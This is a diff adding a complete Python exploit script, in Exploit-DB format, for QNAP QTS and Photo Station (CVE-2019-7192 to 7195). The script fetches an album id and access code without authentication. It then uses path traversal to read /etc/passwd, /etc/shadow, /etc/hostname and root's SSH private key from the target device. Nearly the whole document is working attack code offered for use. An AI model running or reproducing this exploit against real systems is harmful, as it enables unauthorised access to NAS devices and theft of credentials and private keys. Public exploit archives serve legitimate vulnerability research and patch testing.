@@ -1,0 +1,103 @@
+# Exploit Title: QNAP QTS and Photo Station 6.0.3 - Remote Command Execution
+# Exploit Author: Yunus YILDIRIM (Th3Gundy)
+# Team: CT-Zer0 (@CRYPTTECH) - https://www.crypttech.com
+# Date: 2020-05-28
+# Vendor Homepage: https://www.qnap.com
+# Version: QTS < 4.4.1 |  Photo Station < 6.0.3
+# CVE: CVE-2019-7192, CVE-2019-7193, CVE-2019-7194, CVE-2019-7195
+# References: https://github.com/th3gundy/CVE-2019-7192_QNAP_Exploit
+# References: https://medium.com/@cycraft_corp/qnap-pre-auth-root-rce-affecting-312k-devices-on-the-internet-fc8af285622e
+# References: https://www.qnap.com/zh-tw/security-advisory/nas-201911-25
+
+######################################################################
+######################################################################
+
+#!/usr/bin/python3
+
+__author__  = "Yunus YILDIRIM (@Th3Gundy)"
+__version__ = "0.1"
+
+
+import requests
+import re, sys
+
+# hide ssl error
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+
+def get_banner():
+    print("""\033[91m
+  █████   ███▄    █  ▄▄▄       ██▓███  
+▒██▓  ██▒ ██ ▀█   █ ▒████▄    ▓██░  ██▒
+▒██▒  ██░▓██  ▀█ ██▒▒██  ▀█▄  ▓██░ ██▓▒
+░██  █▀ ░▓██▒  ▐▌██▒░██▄▄▄▄██ ▒██▄█▓▒ ▒
+░▒███▒█▄ ▒██░   ▓██░ ▓█   ▓██▒▒██▒ ░  ░
+░░ ▒▒░ ▒ ░ ▒░   ▒ ▒  ▒▒   ▓▒█░▒▓▒░ ░  ░
+ ░ ▒░  ░ ░ ░░   ░ ▒░  ▒   ▒▒ ░░▒ ░     
+   ░   ░    ░   ░ ░   ░   ▒   ░░       
+    ░             ░       ░  ░  \033[0m     \033[94m {0} \033[0m
+    """.format(__author__))
+
+
+def get_file_content(file):
+    post_data = {'album': album_id, 'a': 'caption', 'ac': access_code, 'f': 'UMGObv', 'filename': file}
+    file_read_response = req.post(url + "/photo/p/api/video.php", data=post_data, headers=headers, verify=False, timeout=10)
+
+    print("="*65) ; print("{0} file content;\n{1}" .format(file,file_read_response.text))
+
+# print banner
+get_banner()
+
+if len(sys.argv) != 2:
+    print("\033[93mUsage : python3 gundy.py https://vulnerable_url:port\033[0m")
+    sys.exit(-1)
+    
+url = sys.argv[1].rstrip('/')
+headers = {"User-Agent": "Gundy - QNAP RCE"}
+
+# for session cookie
+req = requests.Session()
+
+#######################################################################
+# search album_id
+
+print("="*65)
+post_data = {'a': 'setSlideshow', 'f': 'qsamplealbum'}
+album_id_response = req.post(url + "/photo/p/api/album.php", data=post_data, headers=headers, verify=False, timeout=10)
+
+if album_id_response.status_code != 200:
+    print("album id not found \n\033[91mnot vulnerable\033[0m")
+    sys.exit(0)
+    
+album_id = re.search('(?<=<output>).*?(?=</output>)', album_id_response.text).group()
+
+print("album_id     ==>  " + album_id)
+
+#######################################################################
+# search $_SESSION['access_code'] 
+
+access_code_response = req.get(url + "/photo/slideshow.php?album=" + album_id, headers=headers, verify=False, timeout=10)
+if access_code_response.status_code != 200:
+    print("slideshow not found \n\033[91mnot vulnerable\033[0m")
+    sys.exit(0)
+    
+access_code = re.search("(?<=encodeURIComponent\\(').*?(?=')", access_code_response.text).group()
+
+print("access_code  ==>  " + access_code)
+
+#######################################################################
+
+# /etc/passwd file read
+get_file_content('./../../../../../etc/passwd')
+
+# /etc/shadow read
+get_file_content('./../../../../../etc/shadow')
+
+# /etc/hostname read
+get_file_content('./../../../../../etc/hostname')
+
+# /root/.ssh/id_rsa read
+get_file_content('./../../../../../root/.ssh/id_rsa')
+
+#######################################################################
